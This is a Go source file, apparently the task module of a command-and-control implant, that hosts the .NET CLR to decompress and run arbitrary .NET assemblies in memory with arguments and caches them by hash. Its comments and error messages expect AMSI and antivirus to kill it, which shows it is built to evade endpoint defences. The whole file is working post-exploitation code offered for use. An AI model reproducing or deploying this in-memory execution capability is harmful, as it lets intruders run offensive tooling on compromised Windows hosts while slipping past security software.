package tasks

import (
	"bytes"
	"compress/flate"
	"crypto/sha256"
	"fmt"
	clr "github.com/Ne0nd0g/go-clr"
	"io"
	"log"
	"sync"
	"time"
)

var (
	clrInstance *CLRInstance
	assemblies  []*assembly
)

type assembly struct {
	methodInfo *clr.MethodInfo
	hash       [32]byte
}

type CLRInstance struct {
	runtimeHost *clr.ICORRuntimeHost
	sync.Mutex
}

func (c *CLRInstance) GetRuntimeHost(runtime string) *clr.ICORRuntimeHost {
	c.Lock()
	defer c.Unlock()

	if c.runtimeHost == nil {
		c.runtimeHost, _ = clr.LoadCLR(runtime)
		err := clr.RedirectStdoutStderr()
		if err != nil {
			// When running in an IDE, this will fail due no real console to redirect
			log.Printf("could not redirect stdout/stderr: %v\n", err)
		}
	}

	return c.runtimeHost
}

func addAssembly(methodInfo *clr.MethodInfo, data []byte) {
	asmHash := sha256.Sum256(data)
	asm := &assembly{methodInfo: methodInfo, hash: asmHash}
	assemblies = append(assemblies, asm)
}

func getAssembly(data []byte) *assembly {
	asmHash := sha256.Sum256(data)
	for _, asm := range assemblies {
		if asm.hash == asmHash {
			return asm
		}
	}
	return nil
}

func LoadAssembly(data []byte, params []string, runtime string) (string, error) {
	var methodInfo *clr.MethodInfo
	var err error

	// If this crashes, its likely due to AMSI killing it
	rtHost := clrInstance.GetRuntimeHost(runtime)
	if asm := getAssembly(data); asm != nil {
		methodInfo = asm.methodInfo
	} else {
		methodInfo, err = clr.LoadAssembly(rtHost, data)
		if err != nil {
			return "", err
		}
		addAssembly(methodInfo, data)
	}

	if len(params) == 1 && params[0] == "" {
		params = []string{" "}
	}

	stdout, stderr := clr.InvokeAssembly(methodInfo, params)

	return fmt.Sprintf("%s\n%s", stdout, stderr), nil
}

func Runcsharptask(data []byte, params []string) string {
	compressedStream := bytes.NewReader(data)
	var decompressedBuffer bytes.Buffer
	deflateReader := flate.NewReader(compressedStream)
	defer deflateReader.Close()

	io.Copy(&decompressedBuffer, deflateReader)
	decompressedData := decompressedBuffer.Bytes()

	versionString := "v4.0.30319"

	err := clr.RedirectStdoutStderr()
	if err != nil {
		return fmt.Sprintf("Failed to redirect stdout/stderr: %v", err)
	}

	result, err := LoadAssembly(decompressedData, params, versionString)
	if err != nil {
		return fmt.Sprintf("Failed to run assembly: %v\nLikely killed by antivirus", err)
	}

	return result
}

func init() {
	clrInstance = &CLRInstance{}
	assemblies = make([]*assembly, 0)
}

func RunCsharpTaskInBackground(data []byte, params []string, callback func(string)) {
	go func() {
		compressedStream := bytes.NewReader(data)
		var decompressedBuffer bytes.Buffer
		deflateReader := flate.NewReader(compressedStream)
		defer deflateReader.Close()

		io.Copy(&decompressedBuffer, deflateReader)
		decompressedData := decompressedBuffer.Bytes()

		versionString := "v4.0.30319"

		result, err := LoadAssembly(decompressedData, params, versionString)

		time.Sleep(1 * time.Second)

		if err != nil {
			callback(fmt.Sprintf("Failed to run assembly: %v\nLikely killed by antivirus", err))
			return
		}

		callback(result)
	}()
}
